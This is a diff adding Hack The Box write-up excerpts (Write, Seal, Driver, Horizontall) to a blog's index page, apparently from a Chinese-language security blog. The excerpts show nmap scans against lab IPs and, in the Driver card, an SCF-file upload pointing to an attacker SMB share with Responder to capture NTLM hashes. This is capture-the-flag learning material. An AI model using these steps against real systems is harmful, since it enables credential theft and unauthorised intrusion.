@@ -194,6 +194,230 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/10/18/Write/" target="_self">
+          Write
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/18/Write/" target="_self">
+          
+          
+            
+          
+          
+nmap -A -sS -sV 10.10.11.101 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 
+| ssh-hostkey:  
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) 
+|
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-18 15:38" pubdate>
+              2021-10-18
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/10/18/Seal/" target="_self">
+          Seal
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/18/Seal/" target="_self">
+          
+          
+            
+          
+          中等难度，且评分4.8很棒的靶场
+
+nmap -sS -T5 10.10.10.250  
+PORT     STATE SERVICE 
+22/tcp   open  
+ssh 443/tcp  open  https 
+8080/tcp open  http-proxy
+
+
+访问一个8080端口，提示注册用户，注册一个常试登录一下 
+hacker hacker
+
+
+updating tomca
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-18 15:38" pubdate>
+              2021-10-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/10/18/Driver/" target="_self">
+          Driver
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/18/Driver/" target="_self">
+          
+          
+            
+          
+          
+http://10.10.11.106
+
+打开会有一个登陆框(打印机)，随便输入登录名和密码，成功登入
+随便点的时候发现一个上传的地方
+端口情况
+用Responder上传scf文件尝试抓取hash
+
+python Responder.py -I tun0
+
+创建一个1.scf文件，上传上去
+
+[Shell] Command=2 IconFile=\\10.10.14.23\share\test.
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-18 15:38" pubdate>
+              2021-10-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/10/18/Horizontall/" target="_self">
+          Horizontall
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/18/Horizontall/" target="_self">
+          
+          
+            
+          
+          
+nmap -sS -sC -sV -A -p- 10.10.11.105
+
+一样的22 和 80 靶场绑定了域名修改etc/hosts文件 
+
+echo 10.10.11.105 horizontall.htb &gt;&gt; /etc/hosts
+
+gobuster啥都没跑出来 这种情况，网站没有啥功能点，但是扫目录也没有可以利用的东西，尝试从接口入手
+
+jsfinder python3 J
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-18 15:37" pubdate>
+              2021-10-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Hack-The-Box/">Hack The Box</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/10/18/Previse/" target="_self">
           Previse
         </a>
